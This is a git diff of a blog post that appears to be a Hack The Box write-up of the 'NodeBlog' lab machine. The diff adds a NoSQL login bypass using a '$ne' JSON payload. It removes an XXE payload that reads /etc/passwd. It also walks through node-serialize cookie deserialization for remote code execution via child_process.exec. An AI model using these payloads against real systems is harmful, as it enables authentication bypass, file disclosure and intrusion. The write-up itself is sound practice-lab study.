@@ -5,17 +5,18 @@ ShowToc: true
 draft: false
 TocOpen: true
 password:
-isPrivate: true
+isPrivate: false
 tags:
   - blog
-lastmod: 2026-08-26T05:14:43.609Z
+  - easy
+  - HTB
+  - Web-Exploit-NoSQL-login-bypass
+  - Web-Exploit-Node-Express-Deserialization-cookie-rce
+lastmod: 2026-08-26T06:30:24.323Z
 ---
 # Box Info
 
-{{< htb-info "https://www.hackthebox.com/machines/yourmachine" >}}
-
-![YkABZlln.canvas](/ob/Canvas/YkABZlln.canvas)\
-{{< canvas "YkABZlln.canvas" >}}
+{{< htb-info "https://www.hackthebox.com/NodeBlog/" >}}
 
 ```
 ┌─[✗]─[tester@parrot]─[~/Desktop/VPN]
@@ -35,9 +36,15 @@ Nmap done: 1 IP address (1 host up) scanned in 24.74 seconds
 
 ### Port 5000
 
-![Pasted image 20260823174738.png](/ob/Pasted%20image%2020260823174738.png)
+### No-Sql Login
 
-### No-Sql
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Web-Exploit-NoSQL-login-bypass" >}} Change Content-Length from x-www-form-urlencoded to json , and the query inquiry  to json request , and it will be attacted by NoSQL syntax {"\$ne": "njkln"}
+
+{{< /toggle >}}
+
+Manual try to change COntent-Type
 
 ```
 application/json
@@ -47,7 +54,8 @@ application/form-data
 
 ![Pasted image 20260825150944.png](/ob/Pasted%20image%2020260825150944.png)
 
-JSON is not working due to the query inquiry\
+JSON is not working due to the query inquiry
+
 ![Pasted image 20260825163916.png](/ob/Pasted%20image%2020260825163916.png)
 
 so I will use www.convertsimple.com/convert-query-string-to-json/ to help me to change to json
@@ -80,91 +88,31 @@ Priority: u=0, i
 }
 ```
 
-### Upload function
-
-Now upload the normal image
-
-```
-┌─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
-└──╼ $wget https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d0-e874-4392-88d4-60082f83771f.png  
---2026-08-26 09:54:21--  https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d0-e874-4392-88d4-60082f83771f.png
-Resolving cdn.services-k8s.prod.aws.htb.systems (cdn.services-k8s.prod.aws.htb.systems)... 109.176.239.0
-Connecting to cdn.services-k8s.prod.aws.htb.systems (cdn.services-k8s.prod.aws.htb.systems)|109.176.239.0|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 192714 (188K) [image/png]
-Saving to: ‘9e4d90d0-e874-4392-88d4-60082f83771f.png’
-
-9e4d90d0-e874-4392-88d4-60082f83771f.png            100%[=================================================================================================================>] 188.20K  --.-KB/s    in 0.06s   
-
-2026-08-26 09:54:21 (2.96 MB/s) - ‘9e4d90d0-e874-4392-88d4-60082f83771f.png’ saved [192714/192714]
-
-```
-
-but it request the Invalid XML Example
-
-![Pasted image 20260826102304.png](/ob/Pasted%20image%2020260826102304.png)
-
-XML Injection
-
-https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/#tools
-
-The example XXE payload is
-
-````
-<?xml version="1.0"?>
-<!DOCTYPE data [
-<!ELEMENT data (#ANY)>
-<!ENTITY file SYSTEM "file:///etc/passwd">
-]>
-<data```
-<post>
-        <title>0xdf's Post</title>
-        <description>Read File</description>
-        <markdown>&file;</markdown>
-</post>
-```</data>
-````
-
-But you have to modify it to fulfil web's exception  , like it , the `&file;` is for calling back the /etc/passwd
-
-```
-<?xml version="1.0"?>
-<!DOCTYPE data [
-<!ELEMENT data (#ANY)>
-<!ENTITY file SYSTEM "file:///etc/passwd">
-]>
-<post>
-        <title>0xdf's Post</title>
-        <description>Read File</description>
-        <markdown>&file;</markdown>
-</post>
-```
-
-Use the `{` to toggle response error
-
-![Pasted image 20260826103919.png](/ob/Pasted%20image%2020260826103919.png)
-
-We can see the /opt/blog is the web env
-
 ### Web session / cookie analysis
 
-![Pasted image 20260826104217.png](/ob/Pasted%20image%2020260826104217.png)
+{{< toggle "Tag 🏷️" >}}
 
-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
+{{< tag "Web-Exploit-Node-Express-Deserialization-cookie-rce" >}} Knowing the website is using Nodejs and Express , it may use the package of node-serialize,so if it insecure codes , it will let me have the way to RCE   .
 
-Burp auto decode
-
-```
-Cookie: auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
-```
+{{< /toggle >}}
 
 We know it is used the Express and Node.js
 
 ![Pasted image 20260826104437.png](/ob/Pasted%20image%2020260826104437.png)
 
+Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D , so Burp auto decode  will let me to know with URL decode
+
+```
+Cookie: auth={"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
+```
+
+![Pasted image 20260826104217.png](/ob/Pasted%20image%2020260826104217.png)
+
 ### Exploit
 
-https://opsecx.com/blog/exploiting-node-js-deserialization-bug-for-remote-code-execution
+Detailed :  https://opsecx.com/blog/exploiting-node-js-deserialization-bug-for-remote-code-execution
+
+In the Local host to install node-serialize for test
 
 ```
 npm install node-serialize
@@ -196,6 +144,12 @@ require('child_process').exec('ls /', function(error, stdout, stderr) { console.
 var serialize = require('node-serialize');
 console.log("Serialized: \n" + serialize.serialize(y));
 
+
+┌─[tester@parrot]─[~/Desktop/HTB/NodeBlog]
+└──╼ $node log.js
+Serialized: 
+{}
+
 ```
 
 I will make the ping and reverse to cookie to ping me back
@@ -208,7 +162,7 @@ In the Decoder . rce --> url encode --> put in the cookie
 
 ![Pasted image 20260826111542.png](/ob/Pasted%20image%2020260826111542.png)
 
-send it in the repeater
+send it in the repeater .
 
 ![Pasted image 20260826111521.png](/ob/Pasted%20image%2020260826111521.png)
 
